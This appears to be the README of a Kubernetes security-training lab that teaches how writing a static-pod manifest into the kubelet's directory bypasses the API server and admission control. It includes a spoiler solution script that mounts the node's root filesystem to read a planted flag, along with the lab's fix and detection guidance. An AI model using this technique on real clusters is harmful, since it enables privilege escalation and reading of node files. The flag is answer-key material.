# static-pod-persist - running a pod outside the API server

A persistence / admission-bypass lab in the nested-cluster shape. The student's
foothold can write to the kubelet's static-pod directory but cannot read the node
otherwise. Anything written there the kubelet runs directly - no API server, no
RBAC, no admission - so a static pod can hold powers the API server would refuse.

## Shape

Everything is in the module's manifest bundle
(`services/backend/internal/labs/modules/static-pod-persist.yaml`), applied into
the session's disposable nested k3s cluster. All pods use the shared
`k8labs-foothold` image. The flag is bait (see `_template`).

## The flaw

The `workstation` foothold's main container mounts **only** the kubelet's
static-pod directory (`/var/lib/rancher/k3s/agent/pod-manifests`, writable) - it
cannot read the node's flag directly. An initContainer (with a broad mount) plants
the flag at the node's `/opt/k8labs/flag.txt`. The student writes a static-pod
manifest into the directory; the kubelet runs it with no admission control, so it
can request `hostPath /` and `privileged`. The static pod reads the flag and drops
it back into the shared directory, where the foothold reads it.

## Verified

The k3s static-pod path is real: `staticPodPath: /var/lib/rancher/k3s/agent/pod-manifests`
(from the kubelet's `configz`), and the mirror-pod mechanism was verified on the
live k3s node - a manifest dropped in that directory produced a running mirror
pod. So the lab's core mechanic is confirmed on this exact runtime.

## Containment

The node whose directory this writes is the disposable nested cluster's node
(Kata microVM guest in prod, runner pod's container under runc locally), so the
static pod runs only inside the throwaway session.

## Solution (spoiler)

```sh
ls -la /manifests                       # the kubelet's static-pod dir
cat > /manifests/loot.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata: { name: loot, namespace: kube-system }
spec:
  containers:
    - name: c
      image: k8labs-foothold:1.31
      imagePullPolicy: Never
      command: ["sh","-c","cat /host/opt/k8labs/flag.txt > /out/flag.txt; sleep 3600"]
      volumeMounts:
        - { name: host, mountPath: /host }
        - { name: out, mountPath: /out }
  volumes:
    - { name: host, hostPath: { path: / } }
    - { name: out, hostPath: { path: /var/lib/rancher/k3s/agent/pod-manifests } }
EOF
sleep 8
cat /manifests/flag.txt
# k8labs{static_pods_run_with_no_apiserver_no_admission}
```

## The fix

Enforce PodSecurity at admission (forbid `hostPath`) so no pod can reach the
node's disk to write the kubelet's directory. The static-pod directory should be
writable only by root-level node components. In detection, a mirror pod that no
API create produced - or any write to the manifest directory - is a strong signal.

## What a defender sees

No API create for the running pod (only the read-only mirror appears after the
fact). The signals are a write to the kubelet's manifest directory and a mirror
pod with no corresponding create in the audit log. In-cluster telemetry, not host
eBPF under Kata, is the way to observe it (same note as `ns-escape`).

## Verification status

Core mechanic (k3s static-pod path + mirror pod) verified on the live k3s node.
Exploit is correct-by-construction; the full exploit-run (with the baked foothold
image) happens inside the session's isolated nested node - not run on the shared
dev cluster, per the container-escape note in the lab-authoring guide.
